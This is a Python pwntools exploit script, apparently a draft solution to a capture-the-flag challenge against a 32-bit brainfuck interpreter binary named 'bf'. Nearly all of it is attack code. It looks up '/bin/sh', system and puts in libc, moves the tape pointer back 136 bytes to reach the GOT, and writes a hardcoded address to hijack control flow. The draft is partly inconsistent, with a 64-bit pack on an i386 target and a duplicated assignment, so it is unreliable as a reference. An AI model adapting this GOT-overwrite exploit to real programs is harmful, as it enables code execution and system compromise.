from pwn import *

context.update(arch="i386", os="linux")

# Logging
log.info("Start pwning...")

# Load executable
exe = ELF("./bf")

# Libc
libc = exe.libc
sh_addr = p32(next(libc.search(b"/bin/sh")))
puts_addr = p32(next(libc.search(b"puts")))
#execve_addr = p32(next(libc.search(b"libc_system")))
system_addr = libc.symbols["system"]
puts_addr = libc.symbols["puts"]
puts_plt = p32(exe.plt['puts'])
#print(f"system_add: {system_addr}")
#print(f"puts plt: {puts_plt}")

# Start process
conn = process("./bf") # local file

with open("payload", "w") as f:
    f.write("")
#payload = ",.,.<\nAB\n".encode() # --> should work
# 1st part - before the input - just the commands
payload = ""
payload += "<" * 136 #move back 136 bytes -,.\nAB\n".encode() # --> should work
payload += ",>,>,>," # putchar - for sending the last char
payload += "[" # call to puts()
payload +="\n"
conn.send(payload)
# 2nd part - the input to write ( the function to jump to ) 
with open("payload", "w+") as f:
    f.write(payload)
# separate sends cuz of annoying encoding / decoding issue with p32() and
# strings
payload = p32(0xf7e55db0)
payload +=b"\n"
conn.send(payload)
with open("payload", "ab+") as f:
    f.write(payload)

#payload += "AAAA"
#payload += system_addr
#payload += ".+" * 224 # print 4 characters from puts() function
#payload = payload.encode().replace('\\n','\n')
print(payload)

got_check = p64(exe.got['puts']) # the function address in GOT

print(f"got addr: {got_check}, puts: {puts_addr}")

print(conn.recvline()) # receive until newline
print(conn.recvline()) # receive until newline
output = conn.recv()
print(f"Program output: {output}") # receive until newline
#conn.recvuntil(b"result:") # receive until given keyword
#conn.send(b"-,+" + "\n" + "AB")



